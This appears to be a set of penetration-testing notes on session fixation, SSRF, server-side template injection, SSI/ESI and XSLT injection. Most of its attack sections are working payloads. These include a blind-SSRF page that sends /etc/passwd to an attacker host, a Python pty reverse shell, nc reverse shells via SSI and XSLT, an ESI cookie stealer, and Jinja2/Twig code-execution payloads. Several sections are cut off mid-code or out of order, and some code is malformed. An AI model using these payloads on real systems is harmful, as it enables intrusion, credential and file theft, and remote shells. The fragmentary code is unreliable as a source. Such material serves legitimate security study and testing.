There are two other attack vectors against flawed handling of session tokens in web applications. 


**<u>Session Fixation</u>**

This attack enables an attacker to obtain a victom's valid session. A web application vulnerable to session fixation does not assign a new session token after a successful authentication. If an attacker can coerce the victim into using a session token chosen by the attacker, session fixation enables an attacker to steal the victim's session and access their account. 

For instance, assume a web application vulnerable to session fixation uses a session token in the HTTP cookie session. Furthermore, the web application sets the user's session cookie to a value provided in the sid GET parameter. Under these circumstances, a session fixation attack could look as follows:

An attacker obtains a valid session token by authenticating to the web application; assume the session token is a1b2c3d4e5f6. Afterward, the attacker invalidates their session by logging out. The attacker then tricks the victim to use the known session token by sending a vulnerable link. When the victim clicks the link, the application sets the session cookie to the provided value. The victim then authenticates to the vulnerable web application. The victim's browser already stores the attacker-provided session cookie, so it is sent along with the login request. The victim uses the attacker-provided session token since the web application does not assign a new one. 
* Since the attacker knows the victim's session token a1b2c3d4e5f6, they can hijack the victim's session
* A web application must assign a new randomly generated session token after successful authentication to prevent session fixation attacks. 

<br>

**<u>Improper Session Timeout</u>**

A web application must define a proper Session Timeout for a session token. After the time internval defined in the session timeout has passed. the session will expire, and the session token is no longer accepted. If a web application does not define a session timeout, the session token would be valid infinitely, enabling an attacker to use a hijacked session effectively forever. 

For the security of a web application, the session timeout must be appropriately set. Because each web application has different business requirements, there is no universal session timeout value. For instance, a web application dealing with sensitive health data should probably set a session timeout in the range of minutes, while a social media web application might set a session timeout of multiple hours. 

<a id="serversideattacks"></a>

### **`Server-Side Attacks`**

Server-side attacks target the application or service provided by a server, whereas a client-side attack takes place at the client's machine, not the server itself. For example, XSS targets the web browser (client), while server-side attacks would target the web server itself. 

**<u>Server-Side Request Forgery (SSRF)</u>**

SSRF is a vulnerability where an attacker can manipulate a web application into sending unauthorized requests from the web server. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input. Successful exploitation of SSRF can enable an attacker to access internal systems, bypass firewalls, and retrieve sensitive information. 

<br>

**<u>Server-Side Template Injection (SSTI)</u>**

Web applications can use templating engines and server-side templates to generate responses such as HTML content dynamically. This generation is often based on user input, enabling the web application to respond to user input dynamically. When an attacker can inject template code, a SSTI vulnerability can occur. SSTI can lead to various security risks, including data leakage and even full server compromise via RCE. 

<br>

**<u>Server-Side Includes (SSI) Injection</u>**

SSI can also be used to generate HTML responses dynamically. SSI directives instruct the webserver to include additional content dynamically. These directives are embedded into HTML files. For instance, SSI can be used to include content that is present in all HTML pages, such as headers or footers. When an attacker can inject commands into the SSI directives, SSI injections can occur. SSI injection can lead to data leakage or even RCE. 

<br>

**<u>eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection</u>**

XLST server-side injection is a vulnerability that arises when an attacker can manipulate XSLT transformations performed on the server. XSLT is a language used to transform XML documents into other formats, such as HTML, and is commonly employed in web applications to generate content dynamically. In the context of XSLT server-side injection, attackers exploit weaknesses in how XSLT transformations are handled, allowing them to inject and execute arbitrary code on the server.

<a id="serversideattckssrf"></a>

#### **`Server-Side Request Forgery (SSRF)`**

Again, SSRF occurs when a web application fetches additional resources from a remote location based on user-supplied data, such as a URL. Suppose a web server fetches remote resources based on user input. In that case, an attacker might be able to coerce the server into making requests to arbitrary URLs supplied by the attacker; i.e., the web server is vulnerable to SSRF. Depending on the web application's configuration, SSRF vulnerabilities can have devastating consequences. 

If the web application relies on a user-supplied URL scheme or protocol, an attacker might be able to cause even further undesired behavior by manipulating the URL scheme. For instance, the following URL schemes are commonly used in the exploitation of SSRF vulnerabilities:

* **`http://` and `https://`:** These URL schemes fetch content via HTTP/S requests. An attacker might use this in the exploitation of SSRF vulnerabilities to bypass WAFs, access restricted endpoints, or access endpoints in the internal network. 

* **`file://`:** This URL scheme reads a file from the local file system. An attacker might use this in the exploitation of SSRF vulnerabilities to read local files on the web server (LFI)

* **`gopher://`:** This protocol can send arbitrary bytes to the specified address. An attacker might use this in the exploitation of SSRF vulnerabilities to send HTTP POST requests with arbitrary payloads or communicate with other services such as SMTP servers or databases. 

<a id="serversideattckidentssrf"></a>

##### **`Identifying SSRF`**

The most common/basic way of identifying SSRF is by intercepting a request in Burp. If the paramater value contains a URL, it may be vulnerable to SSRF. This indicates that the web server fetches the availability information from a separate system determined by the URL passed, often in a POST parameter. Besides parts of **URL requests, look for API specification imports, dashboards using ping or similar functionalities to check sevrer status, remote server connections to fetch data, and file imports** (images, PDFs, HTML, etc). Also, in some cases, it may be beneficial to fuzz for user agents. 

To confirm the vulnerability, supply a URL pointing to the attacking system on the web application and start a netcat listener. The following shows how the POST request would look:
```html
nc -lvnp 8000     #start listener

param=http://x.x.x.x:8000/ssrf&other_param=value

```
If a connection is received, the web server is definitely vulnerable to SSRF. To determine whether the HTTP response reflects the SSRF response back, point the web application to itself by providing a URL like **`http://127.0.0.1/index.php`.** If the response contains the web application's HTML code, the SSRF vulnerability is not blind, meaning the response is displayed to the attacker. 

<br>

**<u>Enumerating the System</u>**

The SSRF vulnerability can e used to conduct a port scan of the system to enumerate running services. To achieve this, the attacker needs to infer whether a port is open or not from the response to the SSRF paylaod. If a port is supplied that is presumably closed (i.e., 81), the response will contain an error message. The following shows how the POST request would look with manual (slow) enumeration:
```html
param=http://127.0.0.1:81&other_param=value

```
To complete an internal port scan of the web server through the SSRF vulnerability, a fuzzing tools like ffuf can be used. First, create a wordlist of the ports that are to be scanned; in this case, the first 10,000 ports:
```bash
seq 1 10000 > ports.txt

```
After, fuzz all open ports by filtering out responses containing the previously identified error message:
```bash
ffuf -w ./ports.txt -u http://domain.com/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "param=http://127.0.0.1:FUZZ/&other_param=value" -fr "Failed to connect to"
```
The results would show the open ports on the web server. If the web server ran other internal services, such as internal web applications, they could be identified through this tactic and accessed through the SSRF vulnerability.

<a id="serversideattckexpssrf"></a>

##### **`Exploiting SSRF`**

In many cases, the endpoint will be restricted. From the previous example, if the URL has a domain, try to access the domain directly through the web browser; add the domain to the hosts file if it is not resolvable. Often, it will not be accessible when access is attempted. Regardless, it may still be possible to access and enumerate the domain through the SSRF vulnerability. For instance, an attacker can conduct a directory brute force attack to enumerate additional endpoints using ffuf. To do so, first determine the web server's response when accessing a non-existing page. 

In this scenario, assume the web server responds with the default Apache 404 response. To also filter out any HTTP 403 respones, filter the results based on the corresponding string; with Apache, it will be something like "Server at domain.com port 80." Also with Apache, specify .php extensions because the web application runs PHP. 
```bash
ffuf -w /SecLists/Discovery/Web-Content/raft-small-words.txt -u http://x.x.x.x/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "param=http://domain.com/FUZZ.php&other_param=value" -fr "Server at domain.com Port 80"

```
Depending on the results of this scan, an additional, accessible internal endpoint may be identified. To access this endpoint through the SSRF vulnerability, specify the URL followed by the identified page in the POST parameter to potentially access sensitive information. This would like as follows, assuming *admin.php* was found:
```html
param=http://domain.com/admin.php

```
The URL scheme can also potentially be manipulated to provoke further unexepected behavior. Since the URL schemei s part of the URL supplied to the web application, try reading local files from the fule system using the **`file://`** URL scheme. This can be achieved by supplying the following URL in the POST parameter:
```html
param=file:///etc/passwd
```
If this works, arbitrary files on the filesystem can be read, including the web application's source code. 

<br>

**<u>The gopher Protocol</u>**

Again, SSRF can be used to access restricted internal endpoints; however, attackers are restricted to GET requests as there is no way to send a POST request with the http:// URL scheme. For instance, consider another vulnerable web application. Assume the same internal endpoint of /admin.php was found, but this time it is protected by a login prompt. In this example, the HTML form infers that a POST request needs to be sent to /admin.php containing the password in the corresponding POST parameter; however, there is no way to send this POST request using the http:// URL scheme. 

In this case, the **gopher** URL scheme can be used to send arbitrary bytes to a TCP socket. This protocol enables attackers to create a POST request by building the http request themselves. Assuming the attacker wants to try weak passwords, such as admin, the following POST request can be sent:
```html
POST /admin.php HTTP/1.1
Host: domain.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin

```
All special characters need to be URL-encoded to construct a valid gopher URL from this. In particular, **spaces `%20`** and **newlines `%0D%0A`** must be URL encoded. Afterward, the data needs to be precied with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:
```html
gopher://domain.com:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20domain.com%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin

```
The specified bytes are sent to the target when the web application processes this URL. Since the bytes representing a valid POST request were carefully written, the internal web server should accept the POSt request and respond accordingly; however, **since the URL is being sent within the HTTP POST parameter (param in this case), which itself is URL-encoded, the entire URL needs to be URL-encoded again** to ensure the correct format of the URL after the web server accepts it. Otherwise, a malformed URL error will be returned. After URL encoding the entire gopher URL one more time, the following request can be sent:
```html
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//domain.com%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520domain.com%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&other_param=value

```
If successful, the page would redirect to the hidden endpoint. The gopher protocol can be used to interact with many internal services, not just HTTP servers. For example, assume another SSRF vulnerability is found on a server that has TCP port 25 (SMTP) open locally. Gopher can be used to interact with this internal SMTP server; however, constructing syntactically and semantically correct gopher URLs can take time and effort. Thus, [Gopherus](https://github.com/tarunkant/Gopherus) can be used to generate gopher URLs. The following services are supported:
* MySQL
* PostgreSQL
* FastCGI
* Redis
* SMTP
* Zabbix
* pymemcache
* rbmemcache
* phpmemcache
* dmpmemcache

To use this tool, Python2 needs to be installed. This tool is pretty straightforward, as it will prompt the user to input relavant information, but the following is the syntax for SMTP:
```bash
python2.7 gopherus.py --exploit smtp
```

##### **`Blind SSRF`**

Most real-world SSRF vulnerabilities do not directly display the response back to the attacker. These instances are called blind SSRF vulnerabilities because the response is unknown. The impact of blind SSRF vulnerabilities is generally significantly lower due to the severely restricted exploitation vectors. 

In this scenario, the SSRF vulnerability can be identified by supplying a URL to a system under the control of the attacker and setting up a netcat listener; this is done the same way as before. However, if the web application is pointed to itself, the response will likely not contain the HTML response of the coerced request; instead, the web server will respond normally or with an error. This confirms that this is a blind SSRF vulnerability. 

Exploiting blind SSRF vulnerabilities is generally severely limited compared to non-blind SSRF vulnerabilities; however, depending on the web application's behavior, a restricted local port scan of the system can be conducted, provided the response differs for open and closed ports. In this case, it is extremely important to look at the web server's responses. Depending on how the web application catches unexepected errors, it may not be possible to identify running services that do not respond with valid HTTP responses. 

Once a blind SSRF vulnerability is discovered, however, it can be exploited by creating and hosting a malicious page:
```html
<!DOCTYPE html>
<html>
<body>
   <a>Hello World!</a>
   <imgsrc="http://{VPN IP}:{PORT}/x?=viaimgtag">
</body>
</html>

```
At this point, set up a netcat listener with the defined port and look at the user-agent response. If a response is received, create the following page to disclose local files:
```html
<html>
   <body>
      <b>Exfiltration via Blind SSRF</b>
      <script>
      var readfile =new XMLHttpRequest(); // Read the local file
      var exfil =new XMLHttpRequest(); // Send the file to our server
      readfile.open("GET","file:///etc/passwd", true);
      readfile.send();
      readfile.onload = function() {
         if (readfile.readyState === 4) {
         var url ='http: //{HOST IP}:{PORT}/?data='+btoa(this.response);
         exfil.open("GET",url,true);
         exfil.send();
         }
      }
      readfile.onerror = function(){document.write('<a>Oops!</a>');}
      </script>
   </body>
</html>

```
To achieve RCE, create another malicious html document. First, create the following payload and encode it twice with jq:
```bash
echo "export RHOST="{Host IP}";exportRPORT="{PORT}";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'" | jq -sRr @uri | jq -sRr @uri

```
Now, create the malicious html document to gain a reverse shell:

#### **`Server-Side Template Injection (SSTI)`**

A template engine is software that combined pre-defined templates with dynamically generated data and is often used by web applications to generate dynamic responses. A template can dynamically add content but keep the header and footer the same. This avoids duplicate instances of header and footer in different places, reducing complexity and thus enabling better code maintainability. Two of the most popular template engines are **`Jinja`** and **`Twig`.**

Template engines typically require two inputs: a template and a set of values to be inserted into the template. The template can typically be provided as a string or a file and contains pre-defined places where the template engine inserts the dynamically generated values. The values are provided as key-value pairs so the template engine can place the provided value at the location in the template marked with the corresponding key. Generating a string from the input template and input values is called **rendering.** The template syntax depends on the concrete template engine used. 
* A template variable name will be replaced by the input string, as it is replaced during rendering. When the template is rendered, the template engine must be provided with a value for the variable. Many modern template engines support more xomplex operations typically provided by programming languages, such as conditions and loops. 

SSTI occurs when an attacker can inject templating code into a template that is later rendered by the server. If an attacker injects malicious code, the server potentially executes the code during the rendering process, enabling an attacker to take over the server completely. If an attacker can control the template parameter, SSTI can occur. If templating is implemented correctly, user input is always provided to the rendering function in values and never in the template string; however, SSTI can occur when user input is inserted into the template before the rendering function is called on the template. 
* If a web application calls the rendering function on the same template multiple times, user input can be inserted into the output of the first rendering process, but would be considered part of the template string in the second rendering process. 
* Web applications enabling users to modify or submit existing templates will also result in SSTI.

<a id="serversideattckidentssti"></a>

##### **`Identifying SSTI`**

Before exploiting an SSTI vulnerability, it is essential to confirm that the vulnerability is present and identify the template engine the target application uses, as the exploitation process mostly depends on the concrete template engine in use. This is because each template engine uses a slightly different syntax and supports different functions that can be used for exploitation purposes. 

The process of identifying an SSTI vulnerability is similar to the process of identifying any other injection vulnerability. The most effective way is to inject special characters with semantic meaning in template engines and observe the web application's behavior. As such, the following string is commonly used to provoke an error message in a web application vulnerable to SSTI:
```xml
${{<%[%'"}}%\.

```
The test string should almost always violate the template syntax, as it consists of all special characters that have a particular semantic purpose in popular template engines. This should result in an error if the web application is vulnerable to SSTI. If the injected test string results in an internal server error, it is more likely than not that the parameter might be vulnerable, although it does not confirm vulnerability. 

To enable the successful exploitation of an SSTI vulnerability, first determine the template engine used by the web application. Slight variations in the behavior of different template engines can be used to achieve this. Try the following payloads:
```xml
${7*7}

{7*7}

{{7*7}}

{{7*7'}}

{{7*'7'}}

<%=7*7%>

${{7*7}}

#{7*7}

```
Start with `${7*7}`:
* If the payload was not executed, not outputting 49 or another unexpected string, then try `{{7*7}}`
   * If this payload works, inject the payload `{{7*'7'}}`. 
      * If the result is **7777777,** then **Jinja** is the template engine. 
      * If the result is **49,** then **Twig** is the template engine.  
* If the payload was executed, outputting 49 or another unexpected string, then try `a{*comment*}b`
   * If this payload works, **Smarty** is the template engine
   * If this payload does not work, then try `${"z".join("ab")}`
      * If this works, **Mako** is the template engine
      * If this does not work, the template engine is unknown - try more payloads


To automate this process, use Burp Intruder, [tplmap](https://github.com/epinna/tplmap) (deprecated), or [sstimap](https://github.com/vladko312/SSTImap). SSTImap is probably the best choice because it can get reverse shells, run system commands, disclose local files, and does not require a virtual environment. If tplmap is to be used, though, the following commands can get it started:
```bash
pip install virtualenv

virtualenv -p python3 venv

source venv/bin/activate

pip install -r requirements.txt

#or

python2 get-pip.py

python2 -m pip install pyyaml

./tplmap.py -u 'http: //{Target IP}:{PORT}' -d parameter=value --os-shell (POST REQUESTS)

```
Generally, once a successful payload has been identified, malicious code of the same programming language of the web application can be written and placed within the identified brackets, then cURLed. For example, if the web page was vulnerable to `{{7*7}}'`, cURL the following:
```bash
curl -gis 'http://{Target_IP}:{PORT}/dir?param={{7*7}}'

curl -gis 'http://{Target_IP}:{PORT}/dir?param={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}

curl -X POST -d '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}' http://{Target IP}:{PORT}
```

##### **`SSTI: Jinja2`**

This step assumes the web application is vulnerable to SSTI and uses the **Jinja2** template engine. Jinja is commonly used in Python web frameworks such as Flask or Django; this section focuses on a Flask web application, as payloads in other web frameworks might be slightly different. In the payload, it is possible to use any libraries imported by the Python application, either directly or indirectly. Additionally, an attacker may be able to import additional libraries through the use of the `import` statement. 

**<u>Information Disclosure</u>**

SSTI vulnerabilities can be exploited to obtain internal information about the web application, including configuration details and the web application's source code. For instance, a web application's configuration can be obtained through the following SSTI payload:
```jinja
{{ config.items() }}

```
This payload will dump the entire web application configuration, including any used secret keys. Further attacks can be prepared using the obtained information. Python code can also be executed to obtain information aboyt the web application's source code. The following SSTI payload can be used to dump all available built-in function:
```jinja
{{ self.__init__.__globals__.__builtins__ }}

```   

**<u>Local File Inclusion</u>**

Python's built-in function, `open`, can be used to include a local file; however, the function cannot be called directly, it must be called from the `__builtins__` dictionary that was previously dumped. This results in the following payload to include the file /etc/passwd:
```jinja
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

```

**<u>Remote Code Execution</u>**

Finally, to achieve RCE in Python, functions provided by the `os` library can be used, like `system` or `popen`. However, if the web application has not already imported this library, it must first be imported by calling the built-in function `import`. This results in the following SSTI payload:
```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

<a id="serversideattcksstitwig"></a>

##### **`SSTI: Twig`**

This step assumes the web application is vulnerable to SSTI and uses the **Twig** template engine. Twig is a template engine for the PHP programming language. 

**<u>Information Disclosure</u>**

In Twig, the `_self` keyword can be used to obtain a little information about the current template. This will output a string template, so the output is limited:
```twig
{{ _self }}

```

**<u>Local File Inclusion</u>**

Reading local files is not possible using internal functions directly provided by Twig; however, the PHP web framework Symfony defines additional Twig filters. One of these filters is `file_excerpt` and can be used to read local files:
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}

```

**<u>Remote Code Execution</u>**

To achieve RCE, a built-in PHP function can be used, such as `system`. An argument can be passed to this function by using Twig's filter function, resulting in any of the following SSTI payloads:
```twig
{{ ['id'] | filter('system') }}
   
```

**<u>Further Remarks</u>**

The syntax for Jinja and Twig template engines are quite different; however, the general idea behind SSTI exploitation remains the same. Therefore, exploiting an SSTI in a template engine the attacker is unfamiliar with is often as simple as becoming familiar with the syntax and supported features of that particular template engine. An attacker can achieve this by readinf the template engine's documentation, or by finding cheat sheets online.

#### **`Server-Side Includes (SSI) Injection`**

SSI is a technology web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers, like Apache and IIS. The use of SSI can often be inferred from the file extension. Typical file extensions include **`.shtml`, `.shtm`, `.stm`.** However, web servers can be configured to support SSI directives in arbitrary file extensions; as such, it is not always possible to conclude that SSI is used from the file extension only. 

SSI uses directives to add dynamically generated content to a static HTML page. These directives consist of the following components:
* **name:** The directive's name
* **parameter name:** One or more parameters
* **name:** One or more parameter values

An SSI directive has the following syntax:
```ssi
<!--#name param1="value1" param2="value" -->

```
The following are some common SSI directives:

**`printenv`:** This directive prints environment variables, it does not take any variables
```ssi
<!--#printenv -->

```
**`config`:** This directive changes the SSI configuration by specifying corresponding parameters; for instance, it can be used to change the error message using the errmsg parameter
```ssi
<!--#config errmsg="Error!" -->

```
**`echo`:** This directive prints the value of any variable given in the var parameter. Multiple variables can be printed by specifying multiple var parameters; for instance, the following variables are supported:
* **DOCUMENT_NAME:** The current file's name
* **DOCUMENT_URI:** The current file's URI
* **LAST_MODIFIED:** Timestamp of the last modification of the current file
* **DATE_LOCAL:** Local server time

This would look as follows with the DOCUMENT_NAME and DATE_LOCAL variables:
```ssi
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->

```

**`exec`:** This directive executes the command given in the cmd parameter
```ssi
<!--#exec cmd="whoami" -->

```

**`include`:**  This directive includes the file specified in the virtual parameter. It only allows for the inclusion of files in the web root directory
```ssi
<!--#include virtual="index.html" -->

```
An SSI Injection occurs when an attacker can inject SSI directives into a file that is subsequently served by the web server, resulting in the execution of the injected SSI directives. This scenario can occur in a variety of circumstances; for instance, when the web application contains a vulnerable file upload vulnerability that enables an attacker to upload a file containing malicious SSI directives into the web root directory. Additionally, attackers might be able to inject SSI directives if a web application writes user input to a file in the web root directory.

<a id="serversideattckexpssiinj"></a>

##### **`Exploiting SSI Injection`**

First, identify whether the web page uses SSI by using an automated tool or looking for the aforementioned file extensions. Once identified, inject a basic SSI directive in one of the input fields. Start with the following directive:
```ssi
<!--#printenv -->

```
If this outputs the environment variables, instead of the literal string, the web page is vulnerable to SSI Injection. Now, confirm whether arbitrary commands can be executed injecting the exec directive in the input field:
```ssi
<!--#exec cmd="id" -->

```
If this prints the cmd directive works, it is possible to obtain a reverse shell with the same directive through the following payload:
```ssi
<!--#exec cmd="mkfifo /tmp/foo;nc {Attacking IP} {PORT} 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

<a id="serversideattckexpedgesideinj"></a>

##### **`Edge-Side Includes (ESI) Injection`**

ESI is similar to SSI, as it is a small XML-based markup language that allows for dynamic web content assembly. ESI injection can be used to exploit vulnerabilities in web applications that use ESI for dynamic content assembly. 

To identify whether a web server is vulnerable to ESI injection, intercept web requests and look for response headers indicating ESI support, such as `Surrogate-Control: content="ESI/1.0"`. Essentially, if any responses mention ESI, try inputting malicious payloads, either directly in the user input, through Burp, or by crafting a malicious URL (as a parameter value). 

The following payloads can be injected in the corresponding field:
```esi
<esi: include src=http://{Attacking_IP}>     #includes external resource

<esi: include src=http://{Attacking_IP}/{xsspayload.html}>     #includes external script

<esi: include src=http: //{Attacking_IP}/?cookie_stealer.php?=$(HTTP_COOKIE)>    #steals cookies

<esi:include src="/etc/passwd">      #includes local file

<esi:debug/> (Akamai)      #debugging for Akamai (if used)
```

#### **`eXtensible Stylesheet Language Transformation (XSLT) Injection`**

XSLT is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure. Since XSLT operates on XML-based data, consider the following XML document to explore how XSLT operates:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
   <fruit>
      <name>Apple</name>
      <color>Red</color>
      <size>Medium</size>
   </fruit>
   <fruit>
      <name>Banana</name>
      <color>Yellow</color>
      <size>Medium</size>
   </fruit>
   <fruit>
      <name>Strawberry</name>
      <color>Red</color>
      <size>Small</size>
   </fruit>
</fruits>

```
XSLT can be used to define a data format which is subsequently enriched with data from the XML document. XSLT data is structueed similarly to XML; however, it contains XSL elements within nodes prefixed with the xsl-prefix. The following are some commonly used XSL elements:
* **`<xsl:template>`:** This element indicates an XSL template. It can contain a match attribute that contains a path in the XML document that the template applies to 

* **`<xsl:value-of>`:** This element extracts the value of the XML node specified in the select attribute

* **`<xsl:for-each>`:** This element enables looping over all XML nodes specified in the select attribute

For instance, a simple XSLT document used to output all fruits contained within the XML document as well as their color may look as follows:
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/fruits">
	   Here are all the fruits:
	   <xsl:for-each select="fruit">
		   <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
	   </xsl:for-each>
   </xsl:template>
</xsl:stylesheet>

```
The XSLT document contains a single `<xsl:template>` XSL element that is applied to the `<fruits>` node in the XML document. The template consists of the static string "Here are all the fruits:" and a loop over all `<fruit>` nodes in the XML document. For each of these nodes, the values of the `<name>` and `<color>` nodes are printed using the `<xsl:value-of>` XSL element. Combining the sample XML document with the above XSLT data results in the following outout:
```html
Here are all the fruits:
   Apple (Red)
   Banana (Yellow)
   Strawberry (Red)

```
Other XSL elements that can be used to narrow down further or customize the data from an XML document include the following:
* **`<xsl:sort>`:** This element specifies how to sort elements in a for loop in the select argument. Additionally, a sort order may be specified in the order agrument

* **`<xsl:if>`:** This element can be used to test for conditions on a node. The condition is specified in the test argument. 

For instance, these XSL elements can be used to create a list of all fruits that are of a medium size ordered by their color in descending order:
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all fruits of medium size ordered by their color:
		<xsl:for-each select="fruit">
			<xsl:sort select="color" order="descending" />
			<xsl:if test="size = 'Medium'">
			   <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
			</xsl:if>
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>

<!--- Resulting in 
```
```html
Here are all fruits of medium size ordered by their color:
	Banana (Yellow)
	Apple (Red)
```

XSLT can be used to generate arbitrary output strings; for instance, web applications may use it to embed data from XML documents within an HTML response. XSLT injections occur whenever user input is inserted into XSL data before output generation by the XSLT processor. this enables an attacker to inject additional XSL elements into the XSL data, which the XSLT processor will execute during output generation. 

<a id="serversideattckexpxsltinj"></a>

##### **`Exploiting XSLT Injection`**

In user input fields, determine whether the web application stores the module information in an XML document and displays the data using XSLT processing. If this is the case, the web application may be vulnerable to an XSLT injection if the input is inserted without sanitization before XSLT processing. To confirm that, inject a broken XML tag to try to provoke an error in the web application by inputting `<`.

If the web application responds with a server error, it does not confirm that an XSLT injection vulnerability is present, but it does indicate the presence of a security issue. Regardless, if there is a server error, inject the following XSLT elements to get basic information about the XSLT processor:
```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />

```
If the web application interprets the XSLT elements provided, this confirms an XSLT injection vulnerability; furthermore, the XSLT version and libraries used will be output. 

<br>

**<u>Local File Inclusion</u>**

There are multiple different functions that can be used to read a local file with XSLT. Whether a paylaod will work depends on the XSLT version and the configuration of the XSLT library. For instance, XSLT contains a function `unparsed-text` that can be used to read a local file:
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />

```
However, this function only works if XSLT is version 2.0 or higher. If the XSLT version is lower, the web application will error out. If the XSLT library is configured to support PHP functions, the PHP function `file_get_contents` can be used within the following XSLT element:
```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />

```

**<u>Remote Code Execution</u>**

If an XSLT processor supports PHP functions, a PHP function that executes a local system command can be used to obtain RCE. For instance, the PHP function `system` can be called to execute a command:
```xml
<xsl:value-of select="php:function('system','id')" />

<xsl:value-of select="php:function('system','nc x.x.x.x {PORT} -e /bin/bash')" />

```
For a Windows target machine, the process will look slightly different. XSLT supports Java extensions, so Java classes can be used to execute system commands. First, from the attacking machine, download ncat.exe and start a web server. Once this is done, grab the ncat.exe from attacking machine and stage it:
```xml      
<xsl:variable name="in" 
select="Channels:newChannel(URL:openStream(URL:new('http://x.x.x.x/ncat.exe')))" xmlns:URL="java.net.URL" xmlns:Channels="java.nio.channels.Channels" /> 
<xsl:value-of select="$in" /> 

<xsl:variable name="out" 
select="FileOutputStream:getChannel(FileOutputStream:new('ncat.exe'))" xmlns:FileOutputStream="java.io.FileOutputStream" /> 
<xsl:value-of select="$out" /> 

<xsl:variable name="xfer"
```

### **`Session Security`**

A user session can be defined as a sequence of requests originating from the same client and the associated responses during a specific time period. Modern web applications need to maintain user sessions to keep track of information and status about each user. User sessions facilitate the assignment of access or authorization rights, localization, settings, etc., while users interact with an application, pre- and post-authentication. 
* HTTP is a stateless communication protocol, and as such, any request-response transaction is unrelated to other transactions. This means that each request should carry all needed information for the server to act upon it appropriately, and the session state resides on the client's side only
   * Web applications use cookies, URL parameters, URL arguments (GET requests), body arguments (POST requests), and other proprietary solutions for session tracking and management purposes

**<u>Session Identifier Security</u>**

A unique session identifier (Session ID) or token is the basis upon which user sessions are generated and distinguished. If an attacker obtains a session identifier, this can result in session hijacking, where the attacker can essentially impersonate the victim in the web application. An attacker can obtain a Session ID through many techniques, not all of which include actively attacking the victim. A Session ID can also be:
* Captured through passive traffic/packet sniffing
* Identified in logs
* Predicted
* Brute Forced

A Session ID's security level depends on its:
* **Validity Scop:** A secure Session ID should be valid for one session only
* **Randomness:** A secure Session ID should be generated through a robust random number/string generation algorithm so that it cannot be predicted
* **Validity Time:** A secure Session ID should expire after a certain amount of time 

The established programming technologies (PHP, JSP, etc.) generate Session IDs that comply with the above validity scope, randomness, and validity time requirements; however, custom Session ID generation implementation may be insecure, so extensive testing needs to be done. 

A Session ID's security level also depends on the location where it is stored:
* **URL:** If this is the case, the HTTP Referer header can leak a Session ID to other websites. In addition, browser history will also contain any Session ID stored in the URL

* **HTML:** If this is the case, the Session ID can be identified in both the browser's cache memory and any intermediate proxies
* **sessionStorage:** sessionStorage is a browser storage feature introduced in HTML5. Session IDs stored in sessionStorage can be retrieved as long as the tab or the browser is open. In other words, sessionStorage data gets cleared when the page session ends; however, a page session survives over page reloads and restores
* **localStorage:** localStorage is a browser storage feature introduced in HTML5. Session IDs stored in localStorage can be retrieved as long as localStorage does not get deleted by the user. This is because data stored within localStorage will not be deleted when the browser process is terminated, with the exception of incognito sessions where data stored within localStorage are deleted by the time the last tab is closed. 

> Session IDs that are managed with no server interference or that do not follow the secure "characteristics" above should be reported as weak. 
 
<br>

**<u>Session Attacks</u>**

The following are the most common session attacks, and those of the following sections:

**`Session Hijacking`:** In these attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim

**`Session Fixation`:** These attacks occur when an attacker can fixate a valid Session ID. The attacker will then have to trick the vuctim into logging into the application using the aforementioned session identifier. If the victim does so, the attacker can proceed to a Session Hijacking attack, since the Session ID is already known. 

**`XSS`:** With a focus on user sessions

**`CSRF (Cross-Site Request Forgery)`:** CSRF/XSRD is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf

